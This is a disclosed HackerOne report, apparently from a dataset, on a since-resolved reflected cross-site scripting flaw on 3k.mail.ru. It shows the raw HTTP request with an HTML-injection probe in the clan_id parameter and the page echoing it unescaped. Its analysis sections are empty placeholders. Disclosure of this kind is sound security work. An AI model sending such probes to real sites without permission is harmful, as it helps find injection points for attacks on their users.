---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '43723'
original_report_id: '43723'
title: '3k.mail.ru: XSS'
weakness: Cross-site Scripting (XSS) - Generic
team_handle: mailru
created_at: '2015-01-14T11:24:54.201Z'
disclosed_at: '2015-09-13T12:09:24.284Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 1
tags:
- hackerone
- cross-site-scripting-xss-generic
---

# 3k.mail.ru: XSS

## Metadata

- HackerOne Report ID: 43723
- Weakness: Cross-site Scripting (XSS) - Generic
- Program: mailru
- Disclosed At: 2015-09-13T12:09:24.284Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

GET /clan_info.php?clan_id=96334"><a>fe647 HTTP/1.1
Host: 3k.mail.ru
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close


<html>
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=Windows-1251" />

	<meta name="mrc__share_title" content="" />

	<meta property="og:title" content="Клан " />
	<meta property="og:description" content="При одном упоминании нашего имени враги трепещут от страха. Пока мы вместе, победа за нами!" />
	<meta property="og:type" content="website" />
	<meta property="og:url" content="http://3k.mail.ru/clan_info.php?clan_id=96334"><a>fe647" />

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
